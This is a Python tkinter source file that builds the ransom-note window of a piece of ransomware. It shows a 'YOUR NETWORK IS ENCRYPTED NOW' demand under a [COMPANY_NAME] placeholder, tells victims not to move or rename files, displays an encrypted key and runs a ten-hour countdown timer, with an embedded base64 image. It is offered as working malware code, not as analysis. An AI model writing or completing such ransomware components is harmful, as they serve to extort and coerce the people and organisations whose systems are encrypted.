from tkinter import *
from tkinter.ttk import *
import os
import threading
import time

class mainwindow(Tk):
    def __init__(self, encrypted_key_b64):
        Tk.__init__(self)
        self.title(string="Warning!!!")  # Set window title
        self.resizable(0, 0)  # Do not allow to be resized
        self.configure(background='black')
        # self.overrideredirect(True)
        self.style = Style()
        self.style.theme_use("clam")
        self.encrypted_key_b64 = encrypted_key_b64
        photo_code = '''iVBORw0KGgoAAAANSUhEUgAAAlgAAAIOCAMAAABTb4MEAAAAY1BMVEVHcEy/v79/f39QUFBAQEAg
ICAAAAAQEBCfn5/f39/v7+9gYGCvr68/NwB/bQBPRAAgGwDPz88wMDCOewDOsQD92gDtzACulgBv
XwAQDgDdvwBfUgCeiAAvKQCPj4++pABwcHBFCib7AAAAAXRSTlMAQObYZgAAGlpJREFUeAHs29Ga
mkAMBeAsQlAQQGUARlj6/k9Z2O72kzGYmXrRm/M/Qz4m5hwJ/hOAj+gQJ8ycxnF0PBHA+7LjgbeS
/EwAbznlKQuSCN8teGeseFf+j6MFEKX8V1GUZVkV9ZujBXC58rfq1pgfbdfX/C09UiCAY8pfhtIa
R3Mf+I88oxAA+c9YtUbQlgN/uQZMFkB24C+VNS5ntJILAXjKrrwaRvNCM/EqxWRB2FxNjXmpvWOy
IETMq6k1mh57FoTu7XfjYcRkga/InSt9snICUJx5VRhPPa8+CeClU6rtV447ry4E8MqVF0NrvLUT
L5KMALQFqzEB7IA1CxQnXt1MkI5XHwQv4YJVGYmdF3Z/gU8IYMfH3oI1//QZ6vtsnrQ1fhnCK4n8
EM4FP5hm45p5kWYEsLu518bRVuworHEU2N9hV5byYjZbzcBPhs5sWRyzYFcundzHgSWj2Sp5EdMT
gAuvrJQF6pPVDrw4kghwaij1d1CerFG8vwOchVNDO/C+WdjfI9oAyBLhM1TwPncIZ16d6Ang1DCZ
jRu/VAg1hwM9AbRlZu+HUMgU7YDIEFy50Bq9s2Jon08OVwIHQkJrHjWs6s0GIkNwXIVTQ8G6xjzq
EBluwJEXdesepnSFMIu/6AEgJOyEKoyqQ2QIuyLh41OySvjM9YgMHegjN+7twE8pXCjORAQQC6eG                                            
ij0NVogMSQToI8/srTIbEyLDfegjT+xvFlrKiAzhU+gjjxxgen5E0VKGTAsJdSMiQ/DqI/esCY8M                                            
AX1ky4F657SKljLEgSGhzCIyBLWPPLMqPDIE9JFrDtcJhZsTAfrISkioqYWKYEwKQB85NDLEyQGn                                            
hkrvI4dHhrfQyBDQR5bdhUUtIvCBU0NZhEWGGekAfeS6bbxODogMERKOIX3kzpjeOzJkv/0d0Ecu                                            
3B+NemQYkwbQR7bK3+5LRIYEh+A+cql2AIWWcpoR/GbvjHdspeEgbKI5MWpLFabQAva+/1P6jybr                                            
DXfPbwBYoPO9wjYsh/k6Ix/ZIscULjLUJ4cKfWTP+MiT4RNqIYuNhHxkZ3kTCyo2IpGP3Jl+O7ZV                                            
R4biG+0jD/hAoD45KDKUj2w8MIWLDFVsVFVIODAh4WT+LtGZI0MhH3kGrI83py2UauF95AKYs5/J                                            
WGwk5COPAGBNq4MlMhTykZcHDHsVG4mtPnKLBRwRGS5soQj5yDOW6FRsJLb5yAWLDCo2Elt85AYf                                            
Mb2Xze8iQyEfOWX8gElbKGK9j+zxQ2YVG4mPPnIhfOSAH1O0hSLW+sgFnzBqC0Ws85EbfEZMKjYS                                            
q3zkjE9pVWwk1vjIHm8I2kJZRFNMiRjKWaAoMhTf6E8NPd7SqNhInxpYH9lhEevHinExMhTykTMM                                            
eEWGHPKRPSzEoC2U79AUU+D0vmV6baH8H/nIreFijgGnyNCOrj47WMnaQrEjH7mDmUHFRlWHhC/G                                            
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
'''
        photo = PhotoImage(data=photo_code)
        photo = photo.subsample(4)

        label = Label(self, image=photo, background='black')
        label.image = photo  # keep a reference!
        label.grid(row=5, column=0, rowspan=2)
        label = Label(self, image=photo, background='black')
        label.image = photo  # keep a reference!
        label.grid(row=5, column=3, rowspan=2)
        message = f'''[COMPANY_NAME]
YOUR NETWORK IS ENCRYPTED NOW
USE - TO GET THE PRICE FOR YOUR DATA
DO NOT GIVE THIS EMAIL TO 3RD PARTIES
DO NOT RENAME OR MOVE THE FILE
THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY
[begin_key]
{self.encrypted_key_b64}
[end_key]
KEEP IT    
'''
        Label(self, text=message, wraplength=550, font='Helvetica 14 bold', foreground='white',
              background='red').grid(row=0, column=0, columnspan=4)

        Label(self, text='', font='Helvetica 18 bold', foreground='red',
              background='black').grid(row=5, column=2)
        Label(self, text='', font='Helvetica 18 bold', foreground='red',
              background='black').grid(row=6, column=2)

        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text='TIME LEFT:', font='Helvetica 18 bold', foreground='red',
                  background='black').grid(row=5, column=0, columnspan=4)
            try:
                s = 36000  # 10 hours
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)

                    Label(self, text=time_left, font='Helvetica 18 bold', foreground='red',
                          background='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print('Closed...')

        if os == 'Windows':
            pass
        else:
            start_thread()
